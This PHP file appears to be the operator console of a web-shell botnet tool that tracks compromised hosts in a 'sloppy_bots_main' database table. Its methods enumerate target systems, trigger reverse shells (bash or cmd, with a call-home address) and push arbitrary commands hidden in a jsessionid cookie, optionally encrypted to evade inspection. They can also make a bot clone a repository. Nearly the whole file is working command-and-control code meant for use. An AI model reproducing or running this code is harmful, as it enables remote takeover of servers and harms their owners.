<?php


class talk_to_me_damnit
{

    private function sys(array $host_data)
    {
        if (!empty($host_data['host'])) {
//            $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
//            $axX = pg_fetch_row($tc);
            curl_setopt(CHH, CURLOPT_URL, sprintf("%s%s:%s%s?qs=cqBS", $host_data['schema'], $host_data['host'], $host_data['port'], $host_data['uri']));
            curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
            $syst = curl_exec(CHH);
            if (!curl_errno(CHH)) {
                switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                    case 200:
                        logo('enumerate system', clears, false, '', $host_data['host']);
                        echo $syst.PHP_EOL;
                        break;
                    default:
                        logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0].$axX[1]);
                        print(sprintf(response_array['default'], $host_data['host'], $host_data['port']));
                }

            }else{
                logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0].$axX[1]);
            }
        } else {
            logo('s', clears, true, "Host and/or URI was empty, please double check.", $host_data['host']);
        }
        return 0;
    }

    private function rev(array $host_data)
    {
        $usePort = null;
        $Ushell = null;
        if (isset($host_data['host'])) {
//            $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = '%s'", $host));
//            $axX = pg_fetch_row($tc);
            if (empty($host_data['local_port'])) {
                $usePort = "1634";
            } else {
                $usePort = $host_data['local_port'];
            }
            if (empty($host_data['method'])) {
                $useMethod = "bash";
            } else {
                $useMethod = $host_data['method'];
            }
            if ($host_data['os_flavor'] == "lin") {
                $useShell = "bash";
            } else {
                $useShell = "cmd";
            }
            if (!empty($host_data['call_home'])){
                $callbackhome = $host_data['call_home'];
            }else{
                $callbackhome = '';
            }
            echo "[ ++ ] Trying: " . $host_data['host'] . " on " . $usePort . "[ ++ ]\n";
            $revCommand = base64_encode($useMethod . "." . $usePort . "." . $useShell. ".". $callbackhome);
            curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
            curl_setopt(CHH, CURLOPT_POST, true);
            curl_setopt(CHH, CURLOPT_COOKIE, "jsessionid={$revCommand}");
            curl_setopt(CHH, CURLOPT_POSTFIELDS, "");
            $syst = curl_exec(CHH);
            if (!curl_errno(CHH)) {
                switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                    case 200:
                        logo('co', clears, false, '', sprintf("%s%s:%s",
                            $host_data['schema'],
                            $host_data['host'],
                            $host_data['port']
                        ));
                        echo $syst;
                        break;
                    default:
                        logo('co',clears,true, 'Reverse Connection Failed double check handler.', $host_data['host'].":".$host_data['port']);
                        print(sprintf(response_array['default'], $host_data['host'].":".$host_data['port']));
                }

            }else{
                logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $host_data['host'].":".$host_data['port']);
            }
        } else {
            logo('reverse', clears, true, '', $host_data['host']);
        }

    }

    private function co($command, $host, bool $encrypt)
    {
        if ($encrypt === true && !is_null($command)) {
            $our_nonce = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_CHACHA20POLY1305_NPUBBYTES);
            $secure_Key = openssl_random_pseudo_bytes(32);
            $additionalData = openssl_random_pseudo_bytes(16);
            try {
                $un = base64_encode($command);
                $ct = sodium_crypto_aead_chacha20poly1305_encrypt($un, $additionalData, $our_nonce, $secure_Key);
                $cr = "2";
                $space_Safe_coms = base64_encode(base64_encode($our_nonce) . "." . base64_encode($secure_Key) . "." . base64_encode($additionalData) . "." . base64_encode($ct));
            } catch (SodiumException $exception) {
                echo $exception->getMessage();
                echo $exception->getTraceAsString();
                echo $exception->getLine();
                return 0;
            }
        } elseif ($command === 'base'){
            $cr = '1b';
            $space_Safe_coms = base64_encode('base');
        } else {
            $cr = "1";
            $space_Safe_coms = base64_encode(serialize(base64_encode($command)));
        }
        if (!empty($host) && !is_null($space_Safe_coms) && !is_null($cr)) {
            $tcO = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
            $axX = pg_fetch_row($tcO);
            curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
            curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
            curl_setopt(CHH, CURLOPT_POST, true);
            curl_setopt(CHH, CURLOPT_COOKIE, "jsessionid={$space_Safe_coms}");
            curl_setopt(CHH, CURLOPT_POSTFIELDS, "cr={$cr}");
            $syst = curl_exec(CHH);
            if (!curl_errno(CHH)) {
                switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                    case 200:
                        logo('co', clears, false, '', sprintf('%s%s -> %s', $axX[0],$axX[1], $command));
                        echo $syst;
                        break;
                    default:
                        logo('co',clears,true, '', sprintf('%s%s', $axX[0],$axX[1]));
                        print(sprintf(response_array['default'], $axX[0],$axX[1]));
                }

            }else{
                logo('co', clears, true, "{$command} Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0] . $axX[1]);
            }
        } else {
            logo('co', clears, true, "Something went wrong.", '');
        }
        return 0;
    }

    private function clo($host, $repo, $uri)
    {
        menu();
        if (!empty($host) && !empty($repo) && !empty($uri)) {
            $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
            $axX = pg_fetch_row($tc);
            curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
            curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
            curl_setopt(CHH, CURLOPT_POST, true);
            curl_setopt(CHH, CURLOPT_POSTFIELDS, "clone=$repo");
            $re = curl_exec(CHH);
            $http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE);
            if (!curl_errno(CHH)) {
                switch ($http_code) {
                    case 200:
                        logo('co',clears,false, '', sprintf('%s%s', $axX[0],$axX[1]));
                        return $re;
                    default:
                        logo('co',clears,true, 'Clone Failed.', sprintf('%s%s', $axX[0],$axX[1]));
                        print(sprintf(response_array['default'], $axX[0],$axX[1]));
                }
            } else {
                $errors = array(
                    "Host" => $host,
                    "Repo" => $repo,
                    "Target URI" => $uri,
                    "Curl Error" => $http_code
                );
                logo('cloner', clears, true, $errors, $host);
            }
            curl_close(CHH);
        } else {
            $errors = array(
                "Host" => $host,
                "Repo" => $repo,
                "Target URI" => $uri
            );
            logo('cloner', clears, true, $errors, $host);
        }

    }
}